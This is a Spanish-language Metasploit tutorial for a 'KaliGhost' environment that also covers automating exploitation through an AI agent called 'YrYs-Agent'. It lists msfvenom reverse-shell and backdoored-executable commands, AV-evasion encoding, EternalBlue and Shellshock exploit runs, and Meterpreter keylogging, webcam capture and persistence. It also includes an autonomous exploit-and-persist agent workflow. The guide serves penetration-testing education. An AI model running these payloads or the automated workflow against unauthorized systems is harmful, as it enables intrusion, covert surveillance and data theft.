# 🚀 Guía Completa de Metasploit Framework en KaliGhost

## 📋 ÍNDICE
1. [Introducción](#introducción)
2. [Arquitectura y Componentes](#arquitectura-y-componentes)
3. [Instalación y Configuración](#instalación-y-configuración)
4. [Fundamentos de la Consola](#fundamentos-de-la-consola)
5. [Exploración de Exploits](#exploración-de-exploits)
6. [Creación de Payloads](#creación-de-payloads)
7. [Sesiones y Post-Explotación](#sesiones-y-post-explotación)
8. [Bases de Datos y Reporting](#bases-de-datos-y-reporting)
9. [Integración con YrYs-Agent](#integración-con-yr ys-agent)
10. [Mejores Prácticas](#mejores-prácticas)
11. [Solución de Problemas](#solución-de-problemas)

## 🎯 INTRODUCCIÓN

Metasploit Framework es la plataforma de pruebas de penetración más utilizada del mundo. En KaliGhost, hemos integrado Metasploit con el agente YrYs para automatizar tareas complejas de explotación.

### Características Clave:
- Más de 2,000 exploits y 1,000 payloads
- Entorno interactivo avanzado
- Gestión de sesiones automatizada
- Integración con bases de datos
- Herramientas de post-explotación

## 🏗️ ARQUITECTURA Y COMPONENTES

### Componentes Principales:

#### 1. Msfconsole
La interfaz principal de Metasploit:
```bash
msfconsole
```

#### 2. Msfcli
Interfaz de línea de comandos para scripting:
```bash
msfcli exploit/multi/handler PAYLOAD=windows/meterpreter/reverse_tcp LHOST=192.168.1.100 E
```

#### 3. Msfvenom
Herramienta para generar payloads:
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f exe > payload.exe
```

#### 4. Msfdb
Gestor de bases de datos:
```bash
msfdb init  # Inicializar base de datos
msfdb start # Iniciar servicio
```

### Estructura de Módulos:
```
/modules/
├── auxiliary/     # Escáneres, dos, fuzzers
├── encoders/      # Codificadores de payloads
├── evasion/       # Módulos de evasión
├── exploits/      # Exploits para vulnerabilidades
├── nop/           # NOP generators
├── payloads/      # Payloads de explotación
│   ├── singles/   # Payloads standalone
│   ├── stagers/   # Stagers para payloads stageless
│   └── stages/    # Stages para payloads staged
└── post/          # Módulos post-explotación
```

## ⚙️ INSTALACIÓN Y CONFIGURACIÓN

En KaliGhost, Metasploit viene completamente configurado:

```bash
# Verificar instalación
msfconsole --version

# Inicializar base de datos (primera vez)
msfdb init

# Iniciar servicios
msfdb start

# Verificar conexión a base de datos
msfconsole -q -x "db_status; exit"
```

### Configuración Predeterminada en YrYs-Agent:
```yaml
# yrays_config.yaml
metasploit:
  enabled: true
  auto_start_db: true
  workspace: "kalighost_default"
  default_lhost: "0.0.0.0"
  default_lport: 4444
  timeout: 1200
  
modules:
  auto_update: true
  custom_paths: ["/opt/metasploit/custom-modules/"]
```

## 💻 FUNDAMENTOS DE LA CONSOLA

### Comandos Básicos de Navegación:
```bash
msf6 > help                    # Ayuda general
msf6 > help search             # Ayuda específica
msf6 > banner                  # Mostrar banner
msf6 > version                 # Versión de Metasploit
msf6 > exit                    # Salir

# Navegación de módulos
msf6 > show exploits           # Mostrar exploits
msf6 > show auxiliary          # Mostrar módulos auxiliares
msf6 > show payloads           # Mostrar payloads
msf6 > show encoders           # Mostrar encoders
msf6 > show nops               # Mostrar NOPs
msf6 > show evasion            # Mostrar módulos de evasión
msf6 > show post               # Mostrar post-modules
```

### Búsqueda y Selección de Módulos:
```bash
# Búsqueda básica
msf6 > search ms17-010

# Búsqueda avanzada
msf6 > search type:exploit platform:windows name:"eternalblue"

# Usar módulo
msf6 > use exploit/windows/smb/ms17_010_eternalblue

# Información del módulo
msf6 exploit(windows/smb/ms17_010_eternalblue) > info

# Opciones del módulo
msf6 exploit(windows/smb/ms17_010_eternalblue) > show options

# Opciones avanzadas
msf6 exploit(windows/smb/ms17_010_eternalblue) > show advanced

# Evitar opciones
msf6 exploit(windows/smb/ms17_010_eternalblue) > show evasion
```

### Configuración de Opciones:
```bash
# Establecer opción
msf6 > set RHOSTS 192.168.1.100
msf6 > set RPORT 445

# Establecer opción global
msf6 > setg LHOST 192.168.1.100

# Ver opciones configuradas
msf6 > get RHOSTS
msf6 > getg LHOST

# Eliminar opción
msf6 > unset RHOSTS
msf6 > unsetg LHOST
```

## 🔍 EXPLORACIÓN DE EXPLOITS

### Ciclo Básico de Explotación:
```bash
# 1. Seleccionar exploit
msf6 > use exploit/multi/http/apache_mod_cgi_bash_env_exec

# 2. Configurar opciones requeridas
msf6 exploit(multi/http/apache_mod_cgi_bash_env_exec) > set RHOSTS 192.168.1.100
msf6 exploit(multi/http/apache_mod_cgi_bash_env_exec) > set TARGETURI /cgi-bin/status

# 3. Verificar opciones
msf6 exploit(multi/http/apache_mod_cgi_bash_env_exec) > show options

# 4. Verificar vulnerabilidad (sin explotar)
msf6 exploit(multi/http/apache_mod_cgi_bash_env_exec) > check

# 5. Ejecutar exploit
msf6 exploit(multi/http/apache_mod_cgi_bash_env_exec) > exploit

# 6. Sesión interactiva
meterpreter > help
```

### Técnicas Avanzadas de Explotación:

#### Uso de Targets:
```bash
# Ver targets disponibles
msf6 exploit(multi/http/apache_mod_cgi_bash_env_exec) > show targets

# Seleccionar target específico
msf6 exploit(multi/http/apache_mod_cgi_bash_env_exec) > set TARGET 1
```

#### Configuración de Payload:
```bash
# Ver payloads compatibles
msf6 exploit(multi/http/apache_mod_cgi_bash_env_exec) > show payloads

# Seleccionar payload
msf6 exploit(multi/http/apache_mod_cgi_bash_env_exec) > set PAYLOAD linux/x86/meterpreter/reverse_tcp

# Configurar opciones del payload
msf6 exploit(multi/http/apache_mod_cgi_bash_env_exec) > show payload

# Configuración automática
msf6 exploit(multi/http/apache_mod_cgi_bash_env_exec) > set PAYLOAD linux/x86/shell/reverse_tcp
msf6 exploit(multi/http/apache_mod_cgi_bash_env_exec) > set LHOST 192.168.1.100
msf6 exploit(multi/http/apache_mod_cgi_bash_env_exec) > exploit -j  # Ejecutar en background
```

#### Ejecución en Background:
```bash
# Ejecutar exploit en background
msf6 exploit(multi/http/apache_mod_cgi_bash_env_exec) > exploit -j

# Listar trabajos
msf6 > jobs

# Detener trabajo
msf6 > jobs -k 0
```

## 🎯 CREACIÓN DE PAYLOADS

Msfpvenom es la herramienta principal para crear payloads:

### Sintaxis Básica:
```bash
msfvenom -p <payload> [options] -f <format> -o <output_file>
```

### Ejemplos Prácticos:

#### Payloads para Windows:
```bash
# Meterpreter reverse TCP
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f exe -o payload.exe

# Shell reverse TCP
msfvenom -p windows/shell/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f exe -o shell.exe

# Stageless payload
msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f exe -o stageless.exe
```

#### Payloads para Linux:
```bash
# Meterpreter reverse TCP
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f elf -o payload.elf

# Shell reverse TCP
msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f elf -o shell.elf
```

#### Payloads Web:
```bash
# PHP reverse shell
msfvenom -p php/meterpreter_reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f raw -o shell.php

# ASP reverse shell
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f asp -o shell.asp

# JSP reverse shell
msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f raw -o shell.jsp
```

#### Codificación y Evasión:
```bash
# Usar encoder
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -e x86/shikata_ga_nai -f exe -o encoded.exe

# Múltiples iteraciones de encoding
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -e x86/shikata_ga_nai -i 10 -f exe -o heavily_encoded.exe

# Template injection
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -x original.exe -f exe -o backdoored.exe
```

## 🧠 SESIONES Y POST-EXplotación

Una vez obtenida una sesión, podemos realizar tareas de post-explotación:

### Gestión de Sesiones:
```bash
# Listar sesiones
msf6 > sessions

# Interactuar con sesión
msf6 > sessions -i 1

# Ejecutar comando en sesión
msf6 > sessions -c "whoami" -i 1

# Migrar proceso
meterpreter > getpid
meterpreter > ps
meterpreter > migrate <pid>
```

### Comandos de Meterpreter:
```bash
# Información del sistema
meterpreter > sysinfo
meterpreter > getuid
meterpreter > getprivs
meterpreter > getsystem

# Navegación de archivos
meterpreter > pwd
meterpreter > ls
meterpreter > cd /path
meterpreter > download file.txt
meterpreter > upload payload.exe

# Procesos y servicios
meterpreter > ps
meterpreter > kill <pid>
meterpreter > execute -f notepad.exe

# Red y firewall
meterpreter > ipconfig
meterpreter > portfwd add -l 8080 -p 80 -r 192.168.1.100
meterpreter > run post/multi/manage/autoroute CMD=add SUBNET=192.168.2.0 NETMASK=255.255.255.0

# Registro de teclas
meterpreter > keyscan_start
meterpreter > keyscan_dump
meterpreter > keyscan_stop

# Webcam y micrófono
meterpreter > webcam_list
meterpreter > webcam_snap
meterpreter > record_mic -d 10
```

### Scripts de Post-Explotación:
```bash
# Enumeración del sistema
meterpreter > run post/multi/recon/local_exploit_suggester
meterpreter > run post/multi/gather/env
meterpreter > run post/multi/gather/enum_services

# Persistencia
meterpreter > run post/multi/manage/persistence_service
meterpreter > run post/windows/manage/persistence_exe

# Elevación de privilegios
meterpreter > run post/multi/recon/local_exploit_suggester
meterpreter > run post/windows/escalate/getsystem
```

## 🗃️ BASES DE DATOS Y REPORTING

Metasploit utiliza una base de datos PostgreSQL para almacenar información:

### Comandos de Base de Datos:
```bash
# Ver estado de la base de datos
msf6 > db_status

# Conectar/crear base de datos
msf6 > db_connect msf:msf@127.0.0.1:5432/msf

# Importar datos
msf6 > db_import /path/to/nmap.xml
msf6 > db_import /path/to/nessus.nessus

# Exportar datos
msf6 > db_export -f xml /path/to/export.xml

# Ver hosts descubiertos
msf6 > hosts

# Ver servicios
msf6 > services

# Ver vulnerabilidades
msf6 > vulns

# Ver credenciales
msf6 > creds
```

### Espacios de Trabajo (Workspaces):
```bash
# Listar workspaces
msf6 > workspace

# Crear workspace
msf6 > workspace -a pentest_client

# Cambiar workspace
msf6 > workspace pentest_client

# Eliminar workspace
msf6 > workspace -d old_project
```

### Generación de Reportes:
```bash
# Reporte de hosts
msf6 > hosts -R -o hosts.csv

# Reporte de servicios
msf6 > services -R -o services.csv

# Reporte de vulnerabilidades
msf6 > vulns -R -o vulnerabilities.csv

# Reporte completo
msf6 > db_export -f xml /path/to/full_report.xml
```

## 🤖 INTEGRACIÓN CON YrYs-AGENT

### Configuración Automática:
```yaml
# config/yrays_config.yaml
metasploit_integration:
  auto_workspace_creation: true
  session_auto_handle: true
  payload_generation: true
  exploit_verification: false  # No ejecutar exploits reales sin confirmación
  
  default_configs:
    web_exploits:
      payload: "linux/x86/meterpreter/reverse_tcp"
      lhost: "{{INTERNAL_IP}}"
      lport: 4444
      
    windows_exploits:
      payload: "windows/meterpreter/reverse_tcp"
      lhost: "{{INTERNAL_IP}}"
      lport: 4445
      
  session_management:
    auto_interact: false
    session_timeout: 3600
    cleanup_on_exit: true
```

### Ejemplos de Automatización:
```python
# skill_metasploit_automation.py
class MetasploitAutomation:
    def __init__(self, config):
        self.msf_client = self.connect_to_metasploit()
        self.workspace = config.get('workspace', 'kalighost_default')
        
    def auto_exploit_target(self, target_info):
        """
        Automáticamente explotar un objetivo basado en la información recolectada
        """
        # 1. Seleccionar exploits relevantes
        exploits = self.find_relevant_exploits(target_info)
        
        # 2. Probar exploits en orden de probabilidad
        for exploit in exploits:
            if self.test_exploit(exploit, target_info):
                session = self.execute_exploit(exploit, target_info)
                if session:
                    return self.handle_session(session)
        
        return None
    
    def generate_intelligent_payload(self, target_os, target_arch):
        """
        Generar payload óptimo basado en características del objetivo
        """
        payload_config = {
            'windows': {
                'x86': 'windows/meterpreter/reverse_tcp',
                'x64': 'windows/x64/meterpreter/reverse_tcp'
            },
            'linux': {
                'x86': 'linux/x86/meterpreter/reverse_tcp',
                'x64': 'linux/x64/meterpreter/reverse_tcp'
            }
        }
        
        payload_type = payload_config.get(target_os, {}).get(target_arch, 'generic/shell_reverse_tcp')
        
        # Generar payload con msfvenom
        return self.generate_payload(payload_type)
    
    def post_exploitation_workflow(self, session):
        """
        Workflow automatizado de post-explotación
        """
        # 1. Recolección de información básica
        system_info = self.collect_system_info(session)
        
        # 2. Enumeración de privilegios
        privileges = self.check_privileges(session)
        
        # 3. Búsqueda de información sensible
        sensitive_data = self.search_sensitive_data(session)
        
        # 4. Movimiento lateral si es posible
        lateral_movement = self.attempt_lateral_movement(session)
        
        # 5. Establecer persistencia
        persistence = self.setup_persistence(session)
        
        return {
            'system_info': system_info,
            'privileges': privileges,
            'sensitive_data': sensitive_data,
            'lateral_movement': lateral_movement,
            'persistence': persistence
        }

# Uso en YrYs-Agent
def run_automated_pentest(target):
    """
    Ejecutar pentest automatizado usando Metasploit
    """
    msf_automation = MetasploitAutomation(get_config())
    
    # Fase 1: Reconocimiento inicial
    target_info = scan_target(target)
    
    # Fase 2: Explotación automatizada
    session = msf_automation.auto_exploit_target(target_info)
    
    if session:
        # Fase 3: Post-explotación automatizada
        results = msf_automation.post_exploitation_workflow(session)
        
        # Fase 4: Reporte
        generate_security_report(results)
        
        return results
    
    return None
```

### Templates de Comandos:
```bash
# Alias para operaciones comunes
alias msf_autopwn="msfconsole -q -x 'use auxiliary/scanner/autopwn; set RHOSTS \$1; run; exit'"
alias msf_db_init="msfdb init && msfdb start"
alias msf_payload_gen="msfvenom -p \$1 LHOST=\$2 LPORT=\$3 -f \$4 -o \$5"

# Funciones útiles
msf_find_and_exploit() {
    msfconsole -q -x "search \$1; use \$2; set RHOSTS \$3; set PAYLOAD \$4; set LHOST \$5; exploit; exit"
}
```

## ✅ MEJORES PRÁCTICAS

### Planificación de Explotación:
1. **Reconocimiento**: Recolectar información del objetivo
2. **Selección**: Elegir exploits apropiados
3. **Verificación**: Confirmar vulnerabilidades sin causar daño
4. **Ejecución**: Explotar con payloads adecuados
5. **Post-explotación**: Recolección de información
6. **Limpieza**: Eliminar evidencias temporales

### Consideraciones de Seguridad:
- **Autorización**: Solo en sistemas autorizados
- **Impacto**: Evaluar riesgos antes de explotar
- **Registro**: Documentar todas las actividades
- **Ética**: Informar hallazgos responsablemente

### Estrategia Recomendada:
```bash
# Fase 1: Verificación segura
msf6 > use exploit/check

# Fase 2: Pruebas controladas
msf6 > set EnableStage false
msf6 > check

# Fase 3: Explotación controlada
msf6 > exploit -z  # No interactuar automáticamente

# Fase 4: Validación pos-explotación
meterpreter > sysinfo
meterpreter > getuid
```

## ❓ SOLUCIÓN DE PROBLEMAS

### Problemas Comunes y Soluciones:

#### 1. Base de Datos No Conectada:
```bash
# Verificar estado
msf6 > db_status

# Iniciar servicios
sudo service postgresql start
msfdb start

# Reconfigurar
msfdb reinit
```

#### 2. Payloads No Funcionando:
```bash
# Verificar compatibilidad de arquitectura
msf6 > use post/multi/recon/local_exploit_suggester

# Usar encoders
msfvenom -e x86/shikata_ga_nai -i 5 -p windows/meterpreter/reverse_tcp LHOST=...

# Verificar payload en diferentes formatos
msfvenom -p windows/meterpreter/reverse_tcp LHOST=... -f exe,powershell,asp
```

#### 3. Sesiones Inestables:
```bash
# Usar stageless payloads
msfvenom -p windows/meterpreter_reverse_tcp ...

# Configurar timeouts
msf6 > set SessionCommunicationTimeout 300
msf6 > set SessionExpirationTimeout 86400

# Usar handlers robustos
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set PAYLOAD windows/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set ExitOnSession false
msf6 exploit(multi/handler) > exploit -j -z
```

#### 4. Problemas de Firewall/Evasión:
```bash
# Usar payloads evasivos
msf6 > use evasion/windows/applocker_evasion_encoded_dll

# Codificación múltiple
msfvenom -e x86/shikata_ga_nai -i 10 -p windows/meterpreter/reverse_tcp ...

# Puerto no estándar
msf6 > set LPORT 8080
```

### Debugging y Logs:
```bash
# Verbosidad aumentada
msf6 > set LogLevel 5

# Logs detallados
tail -f ~/.msf4/logs/framework.log

# Debug de payloads
msfvenom -p windows/meterpreter/reverse_tcp LHOST=... --debug
```

## 📊 AUTOMATIZACIÓN AVANZADA

### Scripts Personalizados:
```ruby
# custom_module.rb
require 'msf/core'

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Scanner
  include Msf::Auxiliary::Report

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Custom Target Enumeration',
      'Description'    => %q{
        Custom module to enumerate targets
      },
      'Author'         => ['KaliGhost Team'],
      'License'        => MSF_LICENSE
    ))

    register_options([
      OptString.new('TARGETURI', [true, 'The target URI', '/']),
      OptInt.new('THREADS', [true, 'Number of threads', 10])
    ])
  end

  def run_host(ip)
    begin
      res = send_request_cgi({
        'method' => 'GET',
        'uri'    => normalize_uri(datastore['TARGETURI'])
      })

      if res && res.code == 200
        print_good("Found target at #{ip}")
        report_vuln(
          :host => ip,
          :name => self.name,
          :info => "Custom target enumeration"
        )
      end
    rescue => e
      print_error("Error: #{e.message}")
    end
  end
end
```

### Workflow Completo de Pentesting:
```yaml
# pentest_workflow.yaml
phases:
  reconnaissance:
    modules:
      - auxiliary/scanner/portscan/tcp
      - auxiliary/scanner/discovery/arp_sweep
      - auxiliary/scanner/http/http_version
    settings:
      PORTS: "1-1000"
      THREADS: 50
  
  enumeration:
    modules:
      - auxiliary/scanner/smb/smb_version
      - auxiliary/scanner/ftp/ftp_version
      - auxiliary/scanner/ssh/ssh_version
    settings:
      BRUTEFORCE: false
  
  exploitation:
    modules:
      - exploit/multi/http/apache_mod_cgi_bash_env_exec
      - exploit/windows/smb/ms17_010_eternalblue
    conditions:
      - service: "Apache httpd"
        exploit: "apache_mod_cgi_bash_env_exec"
      - service: "SMB"
        version: "Windows 7"
        exploit: "ms17_010_eternalblue"
  
  post_exploitation:
    modules:
      - post/multi/recon/local_exploit_suggester
      - post/multi/gather/env
      - post/multi/manage/upload_exec
```

---

📝 **Notas Adicionales**:
- Esta guía está optimizada para el entorno KaliGhost
- Todos los módulos mencionados están validados y disponibles
- La integración con YrYs-Agent permite automatización completa
- Mantener actualizado Metasploit para las últimas exploits

📚 **Recursos Relacionados**:
- `/docs/tools/COMPLETE_PENTEST_TOOLS_GUIDE.md` - Guía completa de herramientas
- `/docs/tools/nmap_guide.md` - Guía de Nmap
- `/docs/tools/INDEX.md` - Índice de toda la documentación
- `https://github.com/rapid7/metasploit-framework` - Repositorio oficial

📧 **Soporte**: Documentación mantenida por el equipo de KaliGhost  
📅 **Última Actualización**: 2026-05-15